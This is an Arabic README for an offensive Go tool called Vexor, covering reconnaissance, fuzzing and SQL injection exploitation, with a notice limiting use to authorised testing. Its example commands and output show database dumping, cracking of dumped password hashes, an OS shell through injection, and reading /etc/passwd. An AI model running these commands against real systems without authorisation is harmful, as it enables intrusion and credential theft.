```text
 ██╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗
 ██║   ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗
 ██║   ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝
 ╚██╗ ██╔╝██╔══╝   ██╔██╗ ██║   ██║██╔══██╗
  ╚████╔╝ ███████╗██╔╝ ██╗╚██████╔╝██║  ██║
   ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
```

**أداة أمنية هجومية عالية الأداء مكتوبة بلغة Go**

[ العربية (Arabic) ] | [ English ](README.md)

[![Go](https://img.shields.io/badge/Go-1.21%2B-00ADD8?style=flat-square&logo=go)](https://go.dev/dl/)
[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
[![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
[![Release](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)](https://github.com/0xseif-code/vexor/releases)

Vexor أداة هجومية في ملف واحد (single binary) لاستكشاف الويب واختبار حقن SQL.
لا تبعيات خارجية ولا شوائب — ملف واحد وقوائم كلمات وهدف، كفى.

```bash
# تثبيت سريع
go install github.com/0xseif-code/vexor/cmd/vexor@latest
```

---

## نظرة عامة

| الوحدة | الوظيفة | المحرّك / التقنية الأساسية |
|---|---|---|
| 🔍 **Subdomain** | استطلاع النطاقات الفرعية | Worker-Pool لنشاط DNS + crt.sh السلبي |
| 📁 **Directory** | اكتشاف المسارات والملفات | فحص تعاودي + تصفية ذكية عبر Baseline |
| 🎯 **Fuzzing** | تعدين الباراميترات | علامات `FUZZ` متعددة المواضع + تحليل الاستجابة |
| 💉 **SQLi** | استغلال الثغرات | 7 تقنيات كشف + تجاوز الـ WAF + سرد/تفريغ آلي + كسر الهاشات |
| 🔑 **Hash Crack** | استعادة كلمات المرور دون اتصال | محدّد نوع تلقائي + عامل عامل داخل Dictionary Worker-Pool |
| 💬 **Interactive UX** | تشغيل موجّه | محرّك أسئلة مع واعي للـ batch + تقدّم حي + ملخّص قياسات |
| 📚 **Wordlists** | إدارة قوائم الكلمات | تنزيل تلقائي من SecLists حسب الطلب (`~/.vexor/`) |

---

## التثبيت

### الطريقة 1 — Go Install (موصى بها)

يتطلب **Go 1.21+**:

```bash
go install github.com/0xseif-code/vexor/cmd/vexor@latest

# تأكّد أن $GOPATH/bin موجود في PATH
export PATH="$PATH:$(go env GOPATH)/bin"    # Linux / macOS
```

### الطريقة 2 — من المصدر

```bash
git clone https://github.com/0xseif-code/vexor.git
cd vexor

make build          # Linux/macOS → ./bin/vexor
# أو: go build -o vexor ./cmd/vexor

# Windows
go build -o vexor.exe ./cmd/vexor
```

### الطريقة 3 — ملف ثنائي من الإصدارات

حمّل ملفًا جاهزًا لمنصّتك من صفحة
[Releases](https://github.com/0xseif-code/vexor/releases). الأسماء بصيغة
`vexor-<os>-<arch>[.exe]`:

```bash
curl -sL -o vexor https://github.com/0xseif-code/vexor/releases/download/v1.0.0/vexor-linux-amd64
chmod +x vexor && sudo mv vexor /usr/local/bin/
```

في أول تشغيل — نزّل قوائم الكلمات مرة واحدة ثم انطلق:

```bash
vexor update-wordlists
vexor subdomain -d example.com
```

---

## مرجع الأوامر

كل الأوامر تشترك في الأعلام العامة أدناه. الشعار والسجلات والتقدّم تذهب إلى
`stderr`؛ والنتائج إلى **stdout** (بدون ألوان، جاهزة للأنابيب) — لذلك
`vexor dir -u URL | tee results.txt` تعمل مباشرة.

| العلم | الاختصار | النوع | الوصف | الافتراضي |
|---|---|---|---|---|
| `--timeout` | | int | مهلة الطلب العالمية (ثوانٍ) | `8` |
| `--threads` | | int | عدد سلاسل التزامن العالمية | `10` |
| `--batch` | | bool | عدم السؤال أبدًا؛ استخدام الإجابات الافتراضية | `false` |
| `--proxy` | | string | بروكسي HTTP/SOCKS5، `http://127.0.0.1:8080` | |
| `--headers` | | stringarray | هيدر مخصّص، قابل للتكرار | |
| `--format` | | string | المخرج: `plain`, `json`, `csv` | `plain` |
| `--output` | | string | حفظ النتائج في ملف أيضًا | |
| `--silent` | | bool | إخفاء الشعار/الأشرطة/السجلات | `false` |
| `--no-color` | | bool | تعطيل ألوان ANSI | `false` |

### `subdomain` — اكتشاف النطاقات الفرعية

DNS بروت فورس نشط + استعلامات crt.sh سلبية، مع إزالة التكرار من المصدرين.

| العلم | الاختصار | النوع | الوصف | الافتراضي |
|---|---|---|---|---|
| `--domain` | `-d` | string | النطاق المستهدف (مطلوب ما لم تُستخدم `-l`) | |
| `--list` | `-l` | string | ملف للنطاقات، نطاق في كل سطر | |
| `--size` | `-s` | string | حجم قائمة الكلمات: `small`, `medium`, `large` | `medium` |
| `--wordlist` | `-w` | string | مسار قائمة مخصّصة (يلغي `-s`) | |
| `--resolvers` | | stringarray | خوادم DNS مخصّصة، قابلة للتكرار | |
| `--active-only` | | bool | DNS فقط بدون crt.sh | `false` |
| `--passive-only` | | bool | crt.sh فقط بدون DNS | `false` |

```bash
vexor subdomain -d example.com -s large --threads 150
vexor subdomain -l domains.txt -s medium
vexor subdomain -d example.com --resolvers 8.8.8.8:53 --resolvers 1.1.1.1:53 --active-only
vexor subdomain -d example.com -w my-subdomains.txt --format json | jq -r '.subdomain'
```

```text
$ vexor subdomain -d example.com -s medium --threads 100
[*] starting subdomain enumeration: example.com (mode=dns+crtsh, threads=100, size=medium)
api.example.com
app.example.com
blog.example.com
cdn.example.com
dev.example.com
shop.example.com
...
[+] domain example.com: 42 subdomains (dns=31, crtsh=11) in 12.4s
[+] subdomain enumeration complete: 42 total subdomains in 12.6s
```

### `dir` — اكتشاف الملفات والدلائل

فحص مسارات عبر قوائم الكلمات مع معايرة soft-404، وتكرار تعاودي، وقوالب
للامتدادات.

| العلم | الاختصار | النوع | الوصف | الافتراضي |
|---|---|---|---|---|
| `--url` | `-u` | string | الهدف، مثل `https://example.com/` (مطلوب) | |
| `--size` | `-s` | string | حجم قائمة الكلمات | `medium` |
| `--wordlist` | `-w` | string | مسار قائمة مخصّصة (يلغي `-s`) | |
| `--ext` | `-x` | stringslice | امتدادات/قوالب، مثل `php,asp,all` | |
| `--recursion` | `-r` | bool | التعمّق في الدلائل المكتشفة | `false` |
| `--depth` | | int | أقصى عمق تعاودي (مع `-r`) | `2` |
| `--match-status` | | string | إبلاغ هذه الأكواد فقط | |
| `--filter-status` | | string | استبعاد هذه الأكواد | |
| `--filter-size` | | string | استبعاد هذه الأحجام بالبايت | |
| `--rate` | | int | أقصى طلب/ثانية (`0` = بلا حد) | `0` |

```bash
vexor dir -u https://example.com -x php,js -r --depth 2
vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297
vexor dir -u https://example.com --match-status 200,301,302 --rate 100
```

```text
$ vexor dir -u https://example.com -x php,js -r --depth 2
[*] starting content discovery on https://example.com (threads=50, depth=2, exts=php,js)
200	2.1 KB	https://example.com/index.php	Home
200	1.4 KB	https://example.com/login.php	Login
302	0 B		https://example.com/admin/
301	0 B		https://example.com/backup/
200	3.8 KB	https://example.com/admin/config.php	Configuration
...
[+] content discovery complete: 18 findings, 4812 requests, 0 errors in 3m12s
```

### `fuzz` — اختبار الباراميترات

علّم مواضع الحقن بعلامة `FUZZ` في الـ URL أو الهيدرات أو الـ body، مع تصفية
الاستجابات حسب الكود والحجم وregex.

| العلم | الاختصار | النوع | الوصف | الافتراضي |
|---|---|---|---|---|
| `--url` | `-u` | string | الهدف مع علامة `FUZZ` (مطلوب) | |
| `--method` | `-X` | string | طريقة HTTP | `GET` |
| `--data` | `-d` | string | جسم الطلب (يدعم علامات FUZZ) | |
| `--wordlist` | `-w` | string | قائمة مخصّصة أو قالبًا جاهزًا | `parameters` |
| `--match-status` | | string | إبلاغ هذه الأكواد فقط | |
| `--filter-status` | | string | استبعاد هذه الأكواد | |
| `--filter-size` | | string | استبعاد هذه الأحجام بالبايت | |
| `--match-regex` | | string | إبلاغ الأجسام المطابقة لهذا regex فقط | |
| `--filter-regex` | | string | استبعاد الأجسام المطابقة لهذا regex | |
| `--delay` | | duration | تأخير بين الطلبات، مثل `100ms` | `0` |

القوالب الجاهزة: `parameters`, `extensions`, `usernames`, `passwords`,
`passwords-large`, `endpoints` — أو مرّر أي مسار ملف كقيمة لـ `-w`.

```bash
vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
```

```text
$ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
[*] starting fuzzing GET https://example.com/api/query?id=FUZZ (threads=50, wordlist=parameters)
[200] https://example.com/api/query?id=admin (id=admin)
[200] https://example.com/api/query?id=debug (id=debug)
[500] https://example.com/api/query?id=__proto__ (id=__proto__)
...
[+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
```

### `sqli` — كشف واستغلال حقن SQL

سبع تقنيات كشف عبر كل الباراميترات — boolean, error, time, union, stacked,
inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّدة. الاستغلال شبه آلي:
`-D ... -T ... --dump` يتنقّل بذاته بين قواعد البيانات ← الجداول ← الأعمدة،
ويمكن كسر هاشات كلمات المرور المكتشفة دون اتصال عبر قاموس مدمج.

| العلم | الاختصار | النوع | الوصف | الافتراضي |
|---|---|---|---|---|
| `--url` | `-u` | string | الهدف، مثل `https://example.com/page?id=1` | |
| `--request` | `-r` | string | ملف طلب خام بصيغة Burp | |
| `--param` | `-p` | string | اختبار باراميتر واحد فقط | |
| `--technique` | `-t` | string | أكواد التقنيات: `B`,`E`,`U`,`S`,`T`,`I`,`O` (قابلة للدمج مثل `BEU`) أو اسم تقنية | `all` |
| `--dbms` | | string | فرض قاعدة بيانات: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
| `--level` | | int | شدة الاختبار (1-5) | `1` |
| `--risk` | | int | خطورة الحمولات (1-3) | `1` |
| `--threads` | | int | سلاسل التزامن | `10` |
| `--fast` | | bool | فحص سريع: مستوى/خطورة 1 + error وunion فقط | `false` |
| `--timeout` | | int | مهلة الطلب (ثوانٍ) | `8` |
| `--delay` | | int | نوم بين الطلبات (ملي ثانية) | `0` |
| `--retries` | | int | إعادة المحاولة للطلبات الفاشلة | `1` |
| `--batch` | | bool | تشغيل غير تفاعلي؛ اختيار الافتراضي لكل سؤال | `false` |
| `--tamper` | | stringslice | سكربتات Tamper، مثل `space2comment,randomcase` | |
| `--auto-tamper` | | bool | بصمة الـ WAF + سلسلة Tamper مقترحة | `false` |
| `--oob-domain` | | string | نطاق لقنوات OOB (DNS/HTTP) | |
| `--dbs` | | bool | سرد قواعد البيانات | `false` |
| `--tables` | | bool | سرد الجداول | `false` |
| `--columns` | | bool | سرد الأعمدة | `false` |
| `--dump` | | bool | تفريغ محتويات جدول | `false` |
| `--database` | `-D` | string | اسم القاعدة لـ `--tables/--columns/--dump` | |
| `--table` | `-T` | string | اسم الجدول لـ `--columns/--dump` | |
| `--column` | `-C` | stringslice | أعمدة محدّدة للتفريغ، قابلة للتكرار | |
| `--crack` | | bool | كسر الهاشات دون سؤال إضافي | `false` |
| `--no-crack` | | bool | عدم كسر الهاشات نهائيًا | `false` |
| `--os-shell` | | bool | قشرة نظام تفاعلية عبر نقطة الحقن | `false` |
| `--read-file` | | string | قراءة ملف من خادم قاعدة البيانات | |
| `--write-file` | | string | كتابة ملف محلي إلى الخادم | |
| `--file-dest` | | string | المسار البعيد لـ `--write-file` | اسم الملف |

```bash
# فحص حقن SQL أساسي
vexor sqli -u "http://target.com/page.php?id=1"

# تقنيتا error + union فقط على باراميتر واحد
vexor sqli -u "http://target.com/page.php?id=1" -p id -t "BEU"

# فحص آلي + استخراج كامل (قاعدة -> جدول -> أعمدة آليًا)
vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs

# تفريغ جدول (يُحلّ اسم الجدول تلقائيًا إذا كان قريبًا)
vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password

# كسر الهاشات بعد التفريغ (أو --batch لرفض الأسئلة)
vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users --crack
vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C password --batch

# استحواذ كامل
vexor sqli -u "http://target.com/page.php?id=1" --os-shell
vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
```

يُجاب عن الأسئلة التفاعلية (تصفية قاعدة البيانات، Tamper للـ WAF، تركيز
الباراميتر، حدّ التفريغ الكبير، كسر الهاشات) تلقائيًا بقيم افتراضية معقولة
عند استخدام `--batch` أو عندما لا يكون stdin طرفية.

```text
$ vexor sqli -u "https://example.com/page?id=1" --level 2
[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=10)
URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
URL query parameter/GET/id technique=error   dbms=mysql confidence=88
POST form parameter/POST/user technique=time      dbms=mysql confidence=76
...
[+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
[i] fingerprinted DBMS: mysql
[+] done | requests=412 | elapsed=125.3s | rate=3.3 req/s | phase(detect=125.3s)

$ vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users --crack
...
[i] first confirmed injection point: GET/id (boolean)
id      username        password
1       admin           *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
2       bob             *A4B6157319038726FF3A9A4DFFED4DEB
...
[+] dumped 2 rows from shop.users (3 columns)
[*] cracking 2 hash(es) via default 10k passwords
[*] Cracking hashes: 1/2 solved (50.0%) | Speed: 312 480 H/s
[*] Cracking finished: 2/2 hashes solved (100.0%) in 412ms (4 940 attempts)
shop.users: admin | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (admin123)
shop.users: bob | *A4B6157319038726FF3A9A4DFFED4DEB (bob)
[+] done | requests=88 | elapsed=9.7s | rate=9.1 req/s | phase(detect=5.2s enum=1.6s dump=2.9s)
```

### `update-wordlists` — إدارة الذاكرة المحلية

```bash
vexor update-wordlists
```

ينزّل ويتحقق من مرآة SecLists في `~/.vexor/wordlists`. نفّذه مرة واحدة بعد
التثبيت، وكلما أردت بيانات محدّثة.

```text
$ vexor update-wordlists
[*] re-downloading all wordlists into ~/.vexor/wordlists
[*] downloading...  65.30% (18.4 MB / 28.2 MB)
[+] wordlist cache updated: 3 files in 46.8s
[i]   directory/medium    8.2 MB  sha256=9f1e4c22a1b3
[i]   subdomain/large    14.3 MB  sha256=4c8d0e71f5a2
[i]   fuzz/parameters     5.7 MB  sha256=b2a9d0134e6e
```

---

## قوائم الكلمات والإعداد المتقدم

- **مكان الذاكرة:** `~/.vexor/wordlists/` — تُنزّل تلقائيًا عند أول استخدام،
  وتُحدَّث عبر `vexor update-wordlists`.
- **حجم (`-s`):** `small`, `medium`, `large`. أوامر `subdomain`, `dir`,
  و`fuzz` تختار الحجم المناسب تلقائيًا.
- **قوالب Fuzz (`-w`):** `parameters`, `extensions`, `usernames`,
  `passwords`, `passwords-large`, `endpoints`.
- **قوائم مخصّصة (`-w /path/to/file.txt`):** أي ملف محلي، كلمة في كل سطر —
  يلغي قالب الحجم.
- **كسر الهاشات** يستخدم قائمة `passwords` المخزّنة افتراضيًا، أو ملفًا
  مخصّصًا؛ يحدد المكسّر نوع الهاش (MD5, SHA-1, bcrypt, ...) ثم يبثّ القاموس
  عبر حوض عاملين، لذلك لا تُحمَّل القوائم الكبيرة في الذاكرة كاملة.

صيغ المخرجات حسب الفحص:

```bash
vexor subdomain -d example.com --format json | jq -r '.subdomain'
vexor dir -u https://example.com --format csv -o results.csv
vexor sqli -u "https://example.com/page?id=1" | tee sqli.log
```

---

## تنبيه قانوني

> **استخدم الأداة بمسؤولية. للاختبار المأذون فقط.**
>
> Vexor أداة أمنية هجومية. يُسمح باستخدامها فقط ضد أنظمة تملكها أو حصلت على
> إذن كتابي لاختبارها. الوصول غير المصرح به إلى أنظمة الكمبيوتر غير قانوني
> في معظم الدول. لا يتحمّل المؤلف أي مسؤولية عن سوء الاستخدام.

## الترخيص

تُوزَّع الأداة بموجب [MIT License](LICENSE). الحقوق محفوظة © (c) 2026
0xseif-code.